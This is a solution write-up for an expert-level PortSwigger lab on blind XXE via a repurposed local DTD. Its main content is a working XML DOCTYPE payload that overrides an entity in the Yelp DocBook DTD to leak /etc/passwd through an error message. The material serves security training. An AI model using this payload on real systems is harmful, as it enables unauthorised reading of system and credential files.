# Lab 06 — Exploiting blind XXE by repurposing a local DTD

> **Expert** · [Official lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

**Entry point:** `POST /product/stock` — blind, no external DTD hosting
possible. **Technique:** redefine an entity from a DTD that already exists
on the target filesystem.

## Solution

1. Inject this DOCTYPE (imports the local Yelp DocBook DTD, then overrides
   its `ISOamso` entity to trigger an error containing `/etc/passwd`):

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

2. The response carries an error message containing `/etc/passwd` —
   lab solved.

## Notes

When you can't host files, find a local DTD (known paths for common
packages) and redefine one of its parameter entities — the file:/// trick
per Jarlsberg/portswigger's "repurposing local DTDs" research.
